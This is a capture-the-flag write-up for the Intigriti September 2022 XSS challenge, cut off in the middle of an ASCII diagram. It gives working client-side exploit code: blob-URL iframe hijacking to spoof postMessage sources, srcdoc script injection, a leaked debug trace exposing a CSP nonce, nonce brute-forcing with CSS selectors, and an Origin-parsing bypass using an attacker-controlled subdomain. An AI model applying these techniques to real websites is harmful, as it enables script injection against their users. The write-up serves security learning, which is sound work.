# Intigrity September 2022 Challenge
###### writeup by [@h43z](https://twitter.com/h43z)

```
For best learning effect always try to solve on your own first! 
If you hit a dead end, 
read writeup until you get a new idea on how to proceed and stop reading further. 
Repeat until successful solve.
```

https://challenge-0922.intigriti.io/

What does the website do? There is just one `<input>` field where you can enter text.
On `ENTER` or on clicking 🔮 the Magic 8 Ball will tell you
some answer to your input (question).

Let's check the code. We see that that `magic.php` is embedded as an iframe.
```
<iframe id="ball" src="https://challenge-0922.intigriti.io/challenge/magic.php" sandbox="allow-scripts allow-same-origin"></iframe>
```
This iframe will receive a message, the input value via `postMessage` with the 
`buttonClick()` function that get's triggered on submission.
```
if (document.querySelector('#question').value){
        document.querySelector('#ball').contentWindow.postMessage({
          question: document.querySelector('#question').value
        }, '*');
      }
```
Now onto `magic.php`. What does it do when it receives a message from `postMessage`.
```
addEventListener('message', e => {
  if ('question' in Object(e.data)){
    fetch('https://challenge-0922.intigriti.io/challenge/api.php?question=' + encodeURIComponent(e.data.question))
      .then(e => e.text())
      .then(e => {
        let resp;
        try{
          resp = JSON.parse(e);
        } catch (_) {
          resp = eval(e);
        }
        shake(resp);
    });
```
It makes another request to `https://challenge-0922.intigriti.io/challenge/api.php?question=`
Then tries to `JSON.parse()` the response of the endpoint and if the parsing throws an error
the response get's passed to `eval`... 

This screams to be investigated. Maybe we can influence the response somehow 
to include a payload from us.

What does this endpoint return? We open it in the browser and provide just
some random value to the `question` parameter.

`https://challenge-0922.intigriti.io/challenge/api.php?question=asdf`
```
{"answer":"Signs point to yes"}
```
Okay. Doesn't seem to be anything reflected here of interest. This will get parsed
via 'JSON.parse' just fine and never reach the `eval(e)`.

We should mess with the `question` parameter value for a while. Maybe some value
will lead to a more interesting response. Multiple things could do that.
A too long string, a number, too big number, special character. Basically anything that
could break the server side code that generates the response.

We try a few values.
```
https://challenge-0922.intigriti.io/challenge/api.php?question=99999999999999999999999
https://challenge-0922.intigriti.io/challenge/api.php?question=-99999999999999999999999
https://challenge-0922.intigriti.io/challenge/api.php?question=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
https://challenge-0922.intigriti.io/challenge/api.php?question='
https://challenge-0922.intigriti.io/challenge/api.php?question="

https://challenge-0922.intigriti.io/challenge/api.php?question=0
https://challenge-0922.intigriti.io/challenge/api.php?question
https://challenge-0922.intigriti.io/challenge/api.php?question[]=bbbbbbbb
```
The last 3 look promising. Sending a `0` gives us
```
## Exception 'Question not found'

#0 /dev/urandom(856294826): setQuestion('"0"')
#1 /dev/urandom(1665290270): initAnonConfig('he2qj4nbcchvcf9md40pnfp28m', 'eyJhdHJhbE9iamVjdCI6WzYwMzA4MzMxOCwyMDEwNzkyMTU0LDE1NjMzMzQ4ODMsMTQ0MTIwMjQ2LDE1NDg5NzYyMTMsMjA1MjcwNTY5MiwxMzU5NjUxOTYwLDczMTI0ODg2MiwxNDg1OTMzODUzLDczNjc2NjA3Ml0sImNzcCI6IjU2NTRlMzFkNWZmMzM4M2MyMDE1Mjg5ZDYwNzEwOWEzIiwidXJhbmRvbUNvbnNpc3RlbmNlIjpbMTIzNzM2OTg3MywxODU5OTg5MjY0LDYxNzYzMjYxNiwzODg5MjQ0NTEsOTI4ODYyNTU0LDY4MTA1ODI5NCwxNTM4MDc4NDExLDExMzQ2NTc5MjEsMTgzNTM2MzQ1NSw5MDk3OTYwMjFdfQ==')
#2 /dev/urandom(1673362906): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', '"0"')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

Not providing any value for `question` shows 
```
## Exception 'Question not found'

#0 /dev/urandom(1078983387): setQuestion('null')
#1 /dev/urandom(300753660): initAnonConfig('he2qj4nbcchvcf9md40pnfp28m', 'eyJhdHJhbE9iamVjdCI6WzYwMzA4MzMxOCwyMDEwNzkyMTU0LDE1NjMzMzQ4ODMsMTQ0MTIwMjQ2LDE1NDg5NzYyMTMsMjA1MjcwNTY5MiwxMzU5NjUxOTYwLDczMTI0ODg2MiwxNDg1OTMzODUzLDczNjc2NjA3Ml0sImNzcCI6IjU2NTRlMzFkNWZmMzM4M2MyMDE1Mjg5ZDYwNzEwOWEzIiwidXJhbmRvbUNvbnNpc3RlbmNlIjpbMTIzNzM2OTg3MywxODU5OTg5MjY0LDYxNzYzMjYxNiwzODg5MjQ0NTEsOTI4ODYyNTU0LDY4MTA1ODI5NCwxNTM4MDc4NDExLDExMzQ2NTc5MjEsMTgzNTM2MzQ1NSw5MDk3OTYwMjFdfQ==')
#2 /dev/urandom(281386763): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', 'null')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

And providing an Array returns
```
## Exception 'Question not found'

#0 /dev/urandom(1707739064): setQuestion('["aaaaaaaa"]')
#1 /dev/urandom(903026658): initAnonConfig('he2qj4nbcchvcf9md40pnfp28m', 'eyJhdHJhbE9iamVjdCI6WzYwMzA4MzMxOCwyMDEwNzkyMTU0LDE1NjMzMzQ4ODMsMTQ0MTIwMjQ2LDE1NDg5NzYyMTMsMjA1MjcwNTY5MiwxMzU5NjUxOTYwLDczMTI0ODg2MiwxNDg1OTMzODUzLDczNjc2NjA3Ml0sImNzcCI6IjU2NTRlMzFkNWZmMzM4M2MyMDE1Mjg5ZDYwNzEwOWEzIiwidXJhbmRvbUNvbnNpc3RlbmNlIjpbMTIzNzM2OTg3MywxODU5OTg5MjY0LDYxNzYzMjYxNiwzODg5MjQ0NTEsOTI4ODYyNTU0LDY4MTA1ODI5NCwxNTM4MDc4NDExLDExMzQ2NTc5MjEsMTgzNTM2MzQ1NSw5MDk3OTYwMjFdfQ==')
#2 /dev/urandom(626561804): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', '["aaaaaaaa"]')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

In all three cases we seem to be getting some kind of trace and debug output with lines
from the actual php code which has a lot of base64 encoded stuff in there.

If you decode the base64 strings we will see it's a JSON object. 
The second argument to the `initAnonConfig` function
has a key with `csp' and the value of `46512fdd35b5ad382767954b3f0c6f1e` in it. We
should remember this, it could potentially become useful later on.
```
{
  "atralObject": [
    2204892,
    623736226,
    2142579215,
    1966761445,
    1519093412,
    2112201876,
    2028747074,
    1792179292,
    803288202,
    789667990
  ],
  "csp": "46512fdd35b5ad382767954b3f0c6f1e",
  "urandomConsistence": [
    1243189873,
    1884983223,
    1794837626,
    1695932971,
    416092641,
    1195114699,
    2032810105,
    1246950332,
    1250924323,
    960103501
  ]
}
```

The full trace and debug response output is not going to be parsed correctly
into correct `JSON`. The `JSON.parse` call will throw an error and the response will get
passed to `eval`.

Although with the method of providing an Array `?question[]=aaaaaaaa` we are even able to
include some by us controlled characters, as they will show up in the response at 
`...setQuestion('["aaaaaaaa"]')...`, the  whole thing ain't javascript. 
And there is nothing we can do to turn it into valid javascript code.

```
eval(`## Exception 'Question not found'

#0 /dev/urandom(1707739064): setQuestion('["aaaaaaaa"]') ...`)

```
Will always throw

```
Uncaught SyntaxError: '#' not followed by identifier
```

No matter what we inject we can't change the fact that the response starts
with `## Exception...`. This will forever be a syntax error when passed to
`eval`.

It seems this `eval` in the code is a trap and dead end in the challenge.

The page continues with calling the function `shake()` with the parsed response.
```
  try{
    resp = JSON.parse(e);
  } catch (_) {
    resp = eval(e);
  }
  shake(resp);
```
That function then sends back data which seem to be some kind of action instructions 
to the `top` which in the regular case is the `index.php` page. 
```
top.postMessage({
  action: 'set',
  element: '#ball',
  attr: 'style',
  value: 'left: ' + rand() + 'px; top: ' + rand() + 'px;'
}, '*');
} else {
top.postMessage({
  action: 'result',
  value: resp.answer
}, '*');
 ```

Using `top` here is kind of a bug, it should instead be `parent`. 
Because if for example the challenge `index.php`
itself was within an iframe, this `magic.php` would
send the message to the uppermost `top` and not the `index.php`.

For us this misuse of `top` vs `parent` has no real meaning as there is nothing interesting gained from
receiving those messages.

Aside from the `eval` in `magic.php` there is only one other place that somehow interacts
and manipulates the webpage. It's `onmessage` listener in the main page `index.php`.
```
addEventListener('message', e => {
  switch(e.data.action){
    case 'set':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
      break;
    case 'delete':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.removeAttribute(e.data.attr, e.data.value));
      break;
    case 'get':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.getAttribute(e.data.attr, e.data.value));
      break;
    case 'count':
      [...document.querySelectorAll(e.data.element)].length;
      break;
    case 'result':
      document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
      break;
    default:
      console.log(e.data);
  }
});
```
Looking promising is the action 'result' that manipulates `innerHTML` of a tag
with the id of `answer`. But before that it also sanitizes whatever it's placing
there by removing '>' and '<'. Those two characters are crucial for any tag
injection with an event handler like the classic `<img/src/onerror=alert(1)>`.
Without `<` and `>` it's just becomes a textnode `img/src/onerror=alert(1)` and totally
useless.

This simple character filter seems robust `.replace(/<|>/g,'')` Not much wiggle room.
No way to trick this.

The other sections of this code where DOM manipulation is taking place is
when it receives the action `set` and then runs `setAttribute` and `delete` with `removeAttribute`.
Two functions that let you set and remove any attribute from a tag.

Reminder how a html tag looks like  `<tag attribute=value></tag>`.

Fun fact `removeAttribute` only expects one parameter. In `s.removeAttribute(e.data.attr, e.data.value)`
the second will not get used. Another bug with zero impact though.

Setting an attribute could help us with the `innerHTML` from the result action.
```
  document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
```
Right now the HTML tag with the id of `answer` within the challenge site
is an h1 tag `<h1 id="answer" class="text-light">`.

But if there was a `<script>` tag with an id of `answer` then one could indeed 
inject code into it. Without even the need for '>' or '<', `innerHTML` would simply 
change the javascript code of the tag.

How would we change any `<script>` tag with to have the id of `answer`? We would make use of
the `setAttribute` of the set action and just set it ourselves. 
But it would have to be a `<script>` that comes before the `<h1>` because
`document.querySelector('#answer')` only returns one and the first html element on the
page that it finds.

Before we continue with this idea let's do a quick proof of concept on how
the `innerHTML` behaves on `script` tags.
Here a short simulation of the situation we are in.

```
<html>

  <script id=answer></script>

  <script>
    document.querySelector('#answer').innerHTML = 'alert(1)'
  </script>

</html>
```
As you can see here https://editor.43z.one/xhs82 this would indeed pop an alert.


The only problem is that the script tag we would work with is this one from the
challenge site.

```
</head>
<body>
  <script nonce="46512fdd35b5ad382767954b3f0c6f1e">
    fetch('https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.0/css/bootstrap.min.css')
    ....
  </script>
```
Would changing the `innerHTML` still work if the `<script>` tag is not empty?
We test it by changing our little proof of concept. https://editor.43z.one/bru59 
```
<html>

  <script id=answer>
    console.log(8)
  </script>

  <script>
    document.querySelector('#answer').innerHTML = 'alert(1)'
  </script>

</html>
```
Unfortunately it doesn't. No `alert` is 
executed. It just runs the `console.log(8)`. This `innerHTML` path 
will not work in our case.

It's starting to look like, whatever the solution to this challenge is it must be solvable 
by utilizing `setAttribte` and/or `removeAttribute`. And those two 
functions must be acting on some of the html tags already present in the page 
as there is no way to add new ones.

The list of interesting tags already present in the page is short. It's
`<iframe>` and `<script>`. By the way, beforehand we forgot to test the obvious thing first.
Changing the `src` attribute on the `script` tag. We maybe suspect now that it will
be similar to the `innerHTML` situation. Dynamically changing the content will
only work if it's empty in the first place. But it's always better to check!

```
<html>
  <script></script>
  <script>
    document.querySelector('script').src = 'https://f.43z.one/a.js'
  </script>
</html>
```
When it's empty, it works.

```
<html>
  <script>/*just a js comment*/</script>
  <script>
    document.querySelector('script').src = 'https://f.43z.one/a.js'
  </script>
</html>
```
If it's not empty, it doesn't. But hey, we checked!

The `<iframe>` is the last interesting tag left. Reading through it's MDN page
https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe the most interesting
attributes seem to be `src` and `srcdoc`. Both let you control the actual content of the 
`iframe`.

Maybe this is a good point to do a reality check before we continue exploring.
So far we run on a few assumptions which is fine but let's make sure we can fulfill
them.

The big one was that we were even able to reach this part of the code somehow.
```
addEventListener('message', e => {
  switch(e.data.action){
    case 'set':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
      break;
    case 'delete':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.removeAttribute(e.data.attr, e.data.value));
      break;
    case 'get':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.getAttribute(e.data.attr, e.data.value));
      break;
    case 'count':
      [...document.querySelectorAll(e.data.element)].length;
      break;
    case 'result':
      document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
      break;
    default:
      console.log(e.data);
  }
});
```

How would we as attackers trigger any of those cases. The messages come from the
`magic.php` page. But what's important to realize is that any page can send another page
messages as long as it has a window reference of the receiver.

And how do you get such a reference you might ask. Two ways, either use the
javascript `open` function like  `winref = open('//challenge-0922.intigriti.io')` or
embed the page in an `iframe`.

We will do the latter.
```
<iframe id=i src="https://challenge-0922.intigriti.io"></iframe>
<script>
  // document.querySelector('iframe').contentWindow 
  // document.getElementById('i').contentWindow
  // window.i.contentWindow
  // window.frames[0]
  // i.contentWindow 
  // frames[0]
  // all now hold a window reference to the embedded page
</script>
```
Now we can now use `postMessage` to send it any message.
```
<iframe onload=run() src="https://challenge-0922.intigriti.io"></iframe>
<script>
  run = e => {
    // the iframe onload event is not enough to make sure that
    // the embedded iframe has finished loading it's javascript listeners
    // To be extra sure we will wait for another 100 milliseconds before
    // we send a message
    setTimeout(_ => frames[0].postMessage('hello', '*'), 100)
  }
</script>
```
But the challenge has a check in place to make sure it's only processing messages
coming from what it considers the right place, the `magic.php` page.
You will find in the `index.php` this code.

```
window.addEventListener('message', e => {
  if (e.source !== document.querySelector('#ball').contentWindow){
    e.stopImmediatePropagation();
  }
});
```
That event listener above is registered before the one we want to get at and
is therefore executed first. It probes if the `source` of the incoming message is not the window that is 
`document.querySelector('#ball').contentWindow`, the  `magic.php`
`iframe`. If that is the case it will stop the event propagation immediately. 
And our messages send from outside will never reach the other `onmessage` listener
with the `setAttribute` and `removeAttribute`.
Not until we make sure that `e.source == document.querySelector('#ball').contentWindow`.

Good thing is that cross origin sites can actually change the location of iframes.
That's pretty much the only thing a cross origin site can do to other sites.
It can't read what the location of an `iframe` is but it can set it.

Here we try to `console.log` the `magic.php` iframe's location. See https://editor.43z.one/413rf
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  // frames[0]     // is the iframe above
  // frames[0][0]  // is iframe within above iframe, so `magic.php`
  run = e => console.log(frames[0][0].location.href)
</script>
```
We get `Uncaught DOMException: Permission denied to get property "href" on cross-origin object`
The domain, in this case `editor.43z.one` (this is from where we run all our tests)
is not allowed to access properties of iframes that are on other 
domains. That's a fundamental security mechanism of browsers, it's called the
Same-Origin-Policy.

BUT we can change the location! Without ever reading it.
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => frames[0][0].location = 'https://google.com'
</script>
```
Or can't we because we get `Content Security Policy: The page’s settings blocked the loading of a resource at https://google.com/ (“default-src”).`
We theoretically could but in this case the application makes use of another but this time optional security mechanism, the
Content Security Policy.

This policy is set in the `meta` tag of the challenge page.
```
<meta http-equiv="Content-Security-Policy" content="default-src 'self' blob: 'unsafe-inline' challenge-0922.intigriti.io; script-src 'nonce-46512fdd35b5ad382767954b3f0c6f1e'; connect-src https:; object-src 'none'; base-uri 'none';">
```
For best understating read the documentation at
https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

Let's have a quick look at the CSP in place. 
```
default-src 'self' blob: 'unsafe-inline' challenge-0922.intigriti.io; 

script-src 'nonce-46512fdd35b5ad382767954b3f0c6f1e';
connect-src https:; 
object-src 'none';
base-uri 'none';
```
It tells us that `<scripts>` are only allowed to load if they have a nonce of attribute of `46512fdd35b5ad382767954b3f0c6f1e`.
But what about an `<iframe>`? It does not mention the `frame-src` directive so
the fallback will become `default-src`.

There it says `self` meaning the same origin as the app. `challenge-0922.intigriti.io` which again is like self.
`unsafe-inline`, unclear what that would mean in the contenxt of `frame-src`.
And then `blob:`. This one is very interesting because we as attackers can create
blob URLs. It's as simple as.
```
  blobUrl = URL.createObjectURL(new Blob(['<h1>hello</h1><script>alert(1)<\/script>'], {type : 'text/html'}))
  console.log(blobUrl)
```
And depending on from which context this was run in you will get an URL looking similar to 
`blob:null/f38316a2-5232-4414-9bd2-1be6f65e2226`

If we would open this URL we would see a big "hello" and an alert popup.
The browser itself created this file internally. And that's why only the 
browser window that created the URL can open it.

Wait a second! We can finally inject arbitrary javascript! Did we solve
the challenge?

```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => {
    burl = URL.createObjectURL(new Blob(['<script>alert(document.domain)<\/script>'], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```

Side note: Javasript cannot hold the string `</script>` in a variable. One will
have to escape the slash with a backslash `<\/script`> or split the string up
`'<' + '/script>'`. If this is not done it will break the parser.
See for yourself https://editor.43z.one/bgn21
```
<script>
  let myVar = `</script>`
</script>
```
`Uncaught SyntaxError: '' literal not terminated before end of script i:2:15`


Anyway continuing. Will it work, will we finally see a popup? No. Chrome will show
an error. `Ignored call to 'alert()'. The document is sandboxed, and the 'allow-modals' keyword is not set.`

Because the `iframe` from `index.php` has the attribute set with `sandbox="allow-scripts allow-same-origin"`
it does only allow whats explicitly mentioned there. For modals like `alert()`, `prompt()`
or `print()` it would need the extra attribute of  'allow-modals'. Let's just quickly
change the `alert` to an `console.log` and see what `document.domain` says.
https://editor.43z.one/c8q7m
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => {
    burl = URL.createObjectURL(new Blob(['<script>console.log(document.domain)<\/script>'], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```
The console shows `editor.43z.one` this means we are not in the context of the challenge
which would be `challenge-0922.intigriti.io`. This seems logical as we created the blob URL in the context
of `editor.43z.one` so that's what it's context will be.
But the point of this challenge is to proof to have control over `challenge-0922.intigriti.io` not some random
3rd party domain. So we are not done yet. 

The blob thing is still cool. Can it help us to trick
```
window.addEventListener('message', e => {
  if (e.source !== document.querySelector('#ball').contentWindow){
    e.stopImmediatePropagation();
  }
});
```
and finally get to the `setAttribute`, `removeAttribute` part? Well, we could load into the 
`<iframe>`(`magic.php` with the id of `ball`) a blob URL which we have full 
control over. And from that "blobbed" file we will then
send a `postMessage` to the parent. This way `e.source` will be equal to 
`document.querySelector('#ball').contentWindow`

Like this https://editor.43z.one/t39xj
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => {
    burl = URL.createObjectURL(new Blob([`
      <script>
        parent.postMessage('hello!', '*') 
      <\/script>
    `], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```
If we check the console we will see the `hello!` printed. This comes directly from the
default case of the `switch` statement we wanted to get at. That also means we successfully tricked
the if clause.
```
if (e.source !== document.querySelector('#ball').contentWindow){
  e.stopImmediatePropagation();
}
```
and got until here

```
addEventListener('message', e => {
  switch(e.data.action){
    ...
    default:
      console.log(e.data); // <------- We've come so far
  }
});
```
It took long to get there but what's next? Now that we could finally make
use of the `setAttribute` function call by just sending the correct object
with `postMessage`.

We came across two interesting attributes of `<iframe>`, `src` and `srcdoc`.
The cool thing about changing the `srcdoc` is that it doesn't switch context.
The `iframe` keeps having access to the parent. It's not really considered a new
domain so it doesn't break SameOriginPolicy. See for yourself https://editor.43z.one/mgwn6

```
<script>
  var i = "i'm a global variable"
</script>

<iframe srcdoc="<script>alert(parent.i)</script>"></iframe>
```
That's because it never changed domain. If we run this 

```
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
```
from https://editor.43z.one/244ck it would show `editor.43z.one`.

This is perfect. We will use this fact about `srcdoc` to our advantage.
We will craft a message that triggers this part of the code
```
  case 'set':
    [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
    break;
```
And change the `srcdoc` of the `<iframe>`. 
Just a quick reminder, at that point the iframe will no longer hold the `magic.php` 
but our blobed URL which send the command the change the `srcdoc` in the first place.

https://editor.43z.one/bh2ba
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => {
    burl = URL.createObjectURL(new Blob([`
      <script>
        parent.postMessage({
          element: '#ball',
          action: 'set',
          attr: 'srcdoc',
          value: '<script>alert(document.domain)</'+'script>'
        }, '*') 
      <\/script>
    `], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```
But what is that. Another error!
```
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-fd66e11600987aa40022b9942292461'". Either the 'unsafe-inline' keyword, a hash ('sha256-X6WoVv8sUlFXk0r+MI/R+p2PsbD1k74Z+jLIpYAjIgE='), or a nonce ('nonce-...') is required to enable inline execution.
```
We forgot! As changing the `srcdoc` does not change the context, the CSP of `challenge-0922.intigriti.io`
is still is enforced! That means the `script` block that holds our payload will need
to have the correct `nonce` to be allowed to execute. 
The same nonce that the CSP sets in the `<meta>` tag with `...script-src 'nonce-fd66e11600987aa40022b9942292461';...`.

But how will our code get it's hand on the `nonce`? 

Remember we saw it base64 encoded in the trace output of the api endpoint?
Let's start there. What if we just request it by making a regular GET request in
javascript from a 3rd party domain like https://editor.43z.one/w4jss
```
<script>
fetch("https://challenge-0922.intigriti.io/challenge/api.php?question=0")
  .then(r => r.text())
  .then(console.log)
</script>
```
But this time the output is different and shorter then if when we opened `https://challenge-0922.intigriti.io/challenge/api.php?question=0`
in the browser.

```
## Exception 'Question not found'

#0 /dev/urandom(1388934387): setQuestion('"0"')
#1 /dev/urandom(1218692528): initAnonConfig('5n1kq06kq0u4s7a399qqdcqnqh', 'W10=')
#2 /dev/urandom(939716205): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', '"0"')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

Before we got the `csp` from the base64 encoded data from the second parameter of `initAnonConfig`.
But now it just shows `W10=` which is base64 decoded for `[]`. Just an empty array.
Looks like the `csp` or better the full javascript object was bound to a PHP session cookie.
Because by default `fetch()` does not include cookies in the request. That's why
wee see 2 different outputs. 

But according to the documentation of fetch it should send the correct cookies if
we provide the object `{credentials: 'include'}` to it's function call. So let's do 
it.

```
<script>
fetch("https://challenge-0922.intigriti.io/challenge/api.php?question=0", {
  credentials: 'include'
})
  .then(r => r.text())
  .then(console.log)
</script>
```
Which will give you following error in the console
```
Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://challenge-0922.intigriti.io/challenge/api.php?question=0. (Reason: expected ‘true’ in CORS header ‘Access-Control-Allow-Credentials’).
```
Again we are getting blocked by the SOP. The server does not set a specific response header.
The browser does not allow us to read the response now. What a bummer!

NOTE: FROM HERE ON THE SOLUTION TO THE CHALLENGE WILL DIFFER FROM OTHERS WHO SOLVED IT.
THERE IS A SERVER BUG WE MISSED, IN PARSING THE ORIGIN HEADER. THE SERVER WILL SET THE 
NEEDED RESPONSE HEADER IF FOR EXAMPLE THE REQUEST WAS MADE FROM 
`challenge-0922.intigriti.io.ATTACKER.COM`. THIS MEANS THE EXPLOIT JUST HAS TO 
BE RUN FROM A SUBDOMAIN `challenge-0922.intigriti.io` WHICH WE WOULD CREATE
ON ANY DOMAIN WE OWN. DOESN'T HAVE TO BE ATTACKER.COM. CAN BE ANYTHING.

As requesting the api didn't work as we liked, what else is there left? 
The `nonce` is obviously reflected in the page `index.php` a few times. 
Once in the actual `<meta>` tag and two times as attribute of `<script>` tags. 

We could use a CSS selector trick with the `document.querySelectorAll` from

```
case 'set':
  [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
  break;
```
and extract the nonce one character at a time. Check if the attribute starts with some
value and go on from there `[attribute^=value]`.

Let's look at this example.

```
<script nonce="bcdef"></script>
<script>
  console.log(document.querySelectorAll('script[nonce^="a"]'))
</script>
```
This would log an empty array as there is no `script` with a attribute `nonce`
that starts with `a`. But we can iterate it.
```
<script nonce="bcdef"></script>
<script>
  console.log(document.querySelectorAll('script[nonce^="b"]'))   // finds script tag
  console.log(document.querySelectorAll('script[nonce^="ba"]'))  // empty array
  console.log(document.querySelectorAll('script[nonce^="bb"]'))  // empty array
  console.log(document.querySelectorAll('script[nonce^="bc"]'))  // finds script tag
  console.log(document.querySelectorAll('script[nonce^="bca"]')) // empty array
  console.log(document.querySelectorAll('script[nonce^="bcb"]')) // empty array
  console.log(document.querySelectorAll('script[nonce^="bcc"]')) // empty array
  console.log(document.querySelectorAll('script[nonce^="bcd"]')) // finds script tag
</script>
```
Great! Only need to guess one character at a time. Which makes this kind
of soft "bruteforce" very quick.

We will send these actions from our blobbed script to `index.php`.
But how would the script know if a nonce matched. We need some way of 
communicating back to the `iframe` that what we just sent was correct.

So we can keep building and sending other nonces to try. Whatever this mechanism
is it can only involve running `s.setAttribute()`. Because that's all we can utilize.

And we wouldn't want to change an attribute of the `script` tag but of the `iframe`
tag. From inside the `iframe` tag we may have the option to listen to changes
of attributes that are set to it on the ouside.

This means we don't want the `documentQuerySelector` to return the `script` tag
but the `iframe` tag. We will get it by combining multiple selectors like the 
`~` (sibling combinator) and `>` (child combinator). 
```
script[nonce^="bcda"]~div>div>iframe
```
Side note: Here is a fun game to learn about CSS selectors https://flukeout.github.io/.


Here are some ideas how to communicate back to the `iframe` via attributes.

  Changing the hash portion of the URL of the `iframe`.
  Hash changes not result in reloading of a page. 
  Add an `onhashchange` event hander listening insinde of `iframe`. 

  Changing the `<iframe>`'s `name` attribute.
  Inside create a function that periodically checks
  if the variable `window.name` changed.

  Change the `width` (or `height`) attribute of the
  `<iframe>` and inside listen to the `onresize` event. Or poll it's own `innerHeight`.
  Then maybe use some kind of code to represent a `nonce` like `a5c2` as an integer.
  Only integers can be used to set `width`, `height`.

  Change the `src` of the `iframe`. Listen inside to `onbeforeuload` event.
  This will destroy the `iframe` though because it's being redirected somewhere
  else. But a few commands should be able to run before the code itself vanishes.

After a lot of experimenting we will come to the conclusion that the `name` method
works but only in firefox. The `hash` and `resize` trick don't seem to work in any browser
in this particular case. And we are left with unloading the `iframe`. We can only
change it's `src` to `https://challenge-0922.intigriti.io`. The only thing
allowed by the CSP except `blob:`.

The unloading of the `iframe` complicates things further as we will not be able
to keep a state of the soft "bruteforced" nonce inside of it. Because it will
be destroyed, again we instructed it to be moved to another domain.

In order to store the 'nonce' somewhere else we will send it away. We will
`postMessage` it ouf of the `iframe` to the `top`. This is the code that changed
the location of the iframe in the iframe.

Here a graphical overview of the process. First the state when everything starts.
```
editor.43z.one/1337
+------------------------------------------------------------+
|  challenge-0922.intigriti.com/challenge/index.php          |
|  +------------------------------------------------------+  |
|  |  challenge-0922.intigriti.com/challenge/magic.php    |  |
|  |  +------------------------------------------------+  |  |
|  |  |                                                |  |  |
|  |  |                                                |  |  |
|  |  +------------------------------------------------+  |  |
|  +------------------------------------------------------+  |
+------------------------------------------------------------+

```
Then from `editor.43z.one/1337` we will change the most inner frame
to a blob with our code in it.
```
                                                           change to blob
                                                                +
                                                                |
 editor.43z.one/1337                                            |
+-----------------------------------------------------------------------+
|                                                               |       |
|   challenge-0922.intigriti.com/challenge/index.php            |       |
|  +-----------------------------------------------------------------+  |
|  |                                                            |    |  |
|  |  blob:editor.43z.one/asdf-wf92fg-gew32-fd302-wfw0   <------+    |  |
|  |  +------------------------------------------------+             |  |
|  |  |                                                |             |  |
|  |  +------------------------------------------------+             |  |
|  +-----------------------------------------------------------------+  |
+-----------------------------------------------------------------------+
```
The blob code starts working.
```
 editor.43z.one/1337
+---------------------------------------------------------------------+
|                                                                     |
